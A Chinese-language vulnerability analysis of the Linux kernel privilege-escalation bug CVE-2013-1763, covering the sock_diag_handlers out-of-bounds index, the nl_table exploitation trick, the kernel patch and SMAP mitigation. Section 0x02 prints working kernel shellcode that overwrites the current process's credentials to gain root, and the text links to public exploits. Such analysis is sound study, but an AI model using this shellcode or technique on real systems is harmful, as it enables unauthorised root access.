@(security)[Linux, CVE]

# CVE-2013-1763 sock_dig_handlers数组本地提权漏洞分析

> 2015-02-01, 北京

## 0x00 前言

这是2013年2月份的一个漏洞，前几天从一个同事那里看到一个exploit，顺便回顾一下这个漏洞。

该漏洞影响的内核版本从3.3到3.8，属于一个本地提权漏洞。用户通过发送构造好的netlink数据包来引起`sock_diag_handlers`数组越界，并在内核进程上下文执行我们的shellcode。

## 0x01 漏洞成因

漏洞来自Linux内核中`NETLINK_SOCK_DIAG`类型的Netlink消息处理函数`__sock_diag_rcv_msg`。该类型在3.3以前叫`NETLINK_INET_DIAG`，只是dump一些inet地址簇的信息，3.3以后改造成了可以dump所有地址簇信息的一个框架，并把宏定义改成了`NETLINK_SOCK_DIAG`。我们来看看内核代码中`__sock_diag_rcv_msg`函数的实现：

	/* linux/include/socket.h */
	    
	#define AF_MAX       40   /* For now.. */
	    
	/* linux/include/linux/sock_diag.h */
	    
	struct sock_diag_handler {
	        __u8 family;
	        int (*dump)(struct sk_buff *skb, struct nlmsghdr *nlh);
	}
	    
	/* linux/net/core/sock_diag.c */
	    
	static const struct sock_diag_handler *sock_diag_handlers[AF_MAX];
	    
	static const inline struct sock_diag_handler *sock_diag_lock_handler(int family)
	{
	        if (sock_diag_handlers[family] == NULL)
	                request_module("net-pf-%d-proto-%d-type-%d", PF_NETLINK,
	                                NETLINK_SOCK_DIAG, family);
	    
	        mutex_lock(&sock_diag_table_mutex);
	        return sock_diag_handlers[family];
	}
	    
	static int __sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)
	{
	        int err;
	        struct sock_diag_req *req = nlmsg_data(nlh);
	        const struct sock_diag_handler *hndl;
	    
	        if (nlmsg_len(nlh) < sizeof(*req))
	                return -EINVAL;
	    
	        hndl = sock_diag_lock_handler(req->sdiag_family);
	        if (hndl == NULL)
	                err = -ENOENT;
	        else
	                err = hndl->dump(skb, nlh);
	        sock_diag_unlock_handler(hndl);
	    
	        return err;
	}

我们发现上面两个函数都没有对`sock_diag_handlers`数组的下标进行越界检查。这里我们有可能让该数组在某个特定的下标让`hndl->dump(skb, nlh)`执行我们的shellcode。因为`req->sdiag_family`的数据类型是`__u8`，取值范围是0 – 255，我们可以利用的范围是`AF_MAX`(40) – 255，我们关注一下`sock_diag_handlers`数组下标从`AF_MAX`到 255之间的数据。

	/* 我的实验环境 */
	root@ubuntu:~# uname -a
	Linux ubuntu 3.5.0-17-generic #28-Ubuntu SMP Tue Oct 9 19:32:08 UTC 2012 i686 i686 i686 GNU/Linux
	
	root@ubuntu:~# grep sock_diag_handler /proc/kallsyms 
	c1a487a0 b sock_diag_handlers

查询可利用的地址范围的符号（0xc1a48840 – 0xc1a48b40）

	c1a487a0 b sock_diag_handlers
	c1a48840 B flow_cache_genid
	c1a48860 b flow_cache_global
	c1a488b0 b flow_cache_gc_lock
	c1a488b2 b __key.7168
	c1a488b4 b rps_dev_flow_lock.37642
	c1a488b6 b rps_map_lock.37599
	c1a488b8 b skb_pool
	c1a488b8 b __key.38018
	c1a488c8 b trapped
	c1a488cc b qdisc_base
	c1a488d0 b qdisc_rtab_list
	c1a488d4 b qdisc_stab_lock
	c1a488d8 b act_base
	c1a488e0 b nl_table_users
	c1a488e4 b nl_table 
	c1a488e8 b netlink_chain
	c1a488e8 b __key.38625
	c1a488e8 b __key.38626
	c1a48900 b family_ht
	c1a48980 B proc_net_netfilter
	c1a489a0 B nf_hooks_needed
	c1a48e80 b nf_log_sysctl_fnames

上面是在这个范围里的一些符号。最后有牛人发现可以利用`nl_table`。dump函数的偏移位置是`struct sock_diag_handler + 4`（注意编译器的对齐规则），我们来看看`nl_table`：

	/* linux/net/netlink/af_netlink.c */
	
	struct nl_pid_hash {
	    struct hlist_head   *table;
	    unsigned long       rehash_time;  <- 可利用的变量
	    …. ….
	};
	
	struct netlink_table {
	    struct nl_pid_hash  hash;
	    struct hlist_head   mc_list;
	    …. ….
	};
	
	static struct netlink_table *nl_table;

`struct netlink_table + 4`的位置是`nl_table->hash.rehash_time`，他表示下次重新计算hash值的时间，数据类型是jiffies值。他的值初始时候等于jiffies，之后每次变化等于`jiffies + 10 * 60 * HZ`，HZ一般等于1000。下面是我记录的几个值（由于在虚拟机中调试，中途有暂停虚拟机，期间jiffies也停止了，不过这个不重要^_^）

| 时间点      | 值（红色标注的值）                                  |
| ---------  | ------------------------------------------------ |
| 16:30      | (gdb) x/2x 0xc1a488e4 <-- nl_table指针
|            | 0xc1a488e4: 0xf5c41000 0x00000101
|            | (gdb) x/2x 0xf5c41000  <-- nl_table->hash指针
|            | 0xf5c41000: 0xf52da900 `0x00013809`
| 20:00      | (gdb) x/2x 0xf5c41000
|            | 0xf5c41000: 0xf2858360 `0x0004ae48`
| 21:30      | (gdb) x/2x 0xf5c41000
|            | 0xf5c41000: 0xf2858b60 `0x000a4ee9`
| 22:50      | (gdb) x/2x 0xf5c41000
|            | 0xf5c41000: 0xf0e6ce00 `0x0021bfa4`
| Day2,10:11 | (gdb) x/2x 0xf5c41000
|            | 0xf5c41000: 0xe9cd8080 `0x0039ff85`

大牛的exploit中把这个值认为是0x10000 – 0x130000之间即可。这里简单说明一下Linux系统上内存虚拟地址的分布情况，我们以32位系统为例: 可以寻址4G的地址空间，其中用户态使用低位的3G，即0x00000000-0xBFFFFFFF，内核使用高位的1G，即0xC0000000 – 0xFFFFFFFF。在Ring3进程只能访问用户态地址空间，在内核上下文中是可以访问全部的4G的地址范围的。经过分析nl_table->hash.rehash_time变量的值正好可以落到用户地址空里，这样我们可以用mmap映射这些地址，并将shellcode拷贝到这块内存中，等待漏洞触发。

## 0x02 内核Shellcode

这里的shellcode是在内核进程上下文中运行的。我们的目标是要修改`current->cred`，先列出两个方案。

- 方案一：使用内核函数**commit_creds**和**prepare_kernel_cred**

		commit_creds(prepare_kernel_cred(0));

这需要查找这两个函数的地址才行，不过普通账户可能没有访问/proc/kallsyms的权限，比如我的系统返回的结果如下：

	macwe@ubuntu:/root$ grep nl_table /proc/kallsyms 
	00000000 d nl_table_lock
	00000000 d nl_table_wait
	00000000 b nl_table_users
	00000000 b nl_table
	macwe@ubuntu:/root$ cat /proc/sys/kernel/kptr_restrict
	1
	/* 相关资料：http://lwn.net/Articles/420403/ */

- 方案二：暴力搜索,在`struct task_struct`中动态查找cred变量的位置并修改之。通常`real_cred`和`cred`指针是一样的，通过这一点来查找cred的内存位置。

		static uint32_t g_uid, g_gid;
		
		void kernel_shellcode(void)
		{
		    int i, j;
		    unsigned long thread_addr;
		    unsigned long task_addr;
		    unsigned long cred_addr;
		
		    /**
		     * get current pointer, find kernel stask size
		     * because task_addr->stack == thread_addr
		     */
		    for (i = 1; i <= 4; ++i) {
		        thread_addr = ((unsigned long)&i) & ~(4096 * i -1);
		        task_addr = *(unsigned long *)(((uint32_t)&i) & ~(4096 * i - 1));
		        if (!task_addr || task_addr < 0xc0000000)
		            continue;
		
		        if (*(unsigned long *)(task_addr + sizeof(long)) == thread_addr)
		            break;
		    }
		    
		    if (5 == i)
		        return;
		
		    /* find and modify current->cred */
		    for (i = 0; i < 2048; ++i) {
		        if ((*(unsigned long *)(task_addr + i) == *(unsigned long *)(task_addr + i + sizeof(unsigned long *))) &&
		                *(unsigned long *)(task_addr +i) >= 0xc0000000) {
		            cred_addr = *(unsigned long *)(task_addr +i); /* found cred */
		            
		            /* find uid position */
		            for (j = 0; j < 32; j += 4) {
		                if (*(uint32_t *)(cred_addr + j) != g_uid ||
		                        *(uint32_t *)(cred_addr + j + 4) != g_gid) 
		                    continue;
		
		                /* set uid and gid to 0 */
		                for (i = 0; i < 8; ++i)
		                    *(uint32_t *)(cred_addr + j + 4 * i) = 0;
		                /* cred.securebits */
		                *(uint32_t *)(cred_addr + j + 32) = 0;
		                /* cred.cap_inheritable */
		                *(uint32_t *)(cred_addr + j + 36) = 0;
		                /* other cap */
		                for (i = 0; i < 3; ++i)
		                    *(uint32_t *)(cred_addr + j + 44 + 8*i) = 0xffffffff;
		                goto next;
		            }
		        }
		    }
		
		next:
		    return;
		}

## 0x03 漏洞利用

http://www.exploit-db.com/exploits/24555/
https://www.exploit-db.com/exploits/24746/
https://www.exploit-db.com/exploits/33336/

## 0x04 修补漏洞

修补的方法只要加上对数组下标的判断即可。

	http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=6e601a53566d84e1ffd25e7b6fe0b6894ffd79c0
	
	diff --git a/net/core/sock_diag.c b/net/core/sock_diag.c
	index 602cd63..750f44f 100644
	--- a/net/core/sock_diag.c
	+++ b/net/core/sock_diag.c
	@@ -121,6 +121,9 @@ static int __sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)
	 	if (nlmsg_len(nlh) < sizeof(*req))
	 		return -EINVAL;
	 
	+	if (req->sdiag_family >= AF_MAX)
	+		return -EINVAL;
	+
	 	hndl = sock_diag_lock_handler(req->sdiag_family);
	 	if (hndl == NULL)
	 		err = -ENOENT;

另外：从linux3.7和Intel的Haswell开始支持SMAP技术可以禁止Ring0的进程访问Ring3的内存，进一步增加了该漏洞利用的难度。

## 0x05 参考资料

http://www.venustech.com.cn/NewsInfo/124/18926.Html
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1763
